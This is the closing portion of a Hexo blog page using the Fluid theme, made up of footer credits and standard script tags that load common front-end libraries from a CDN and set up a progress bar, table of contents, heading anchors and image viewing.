       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
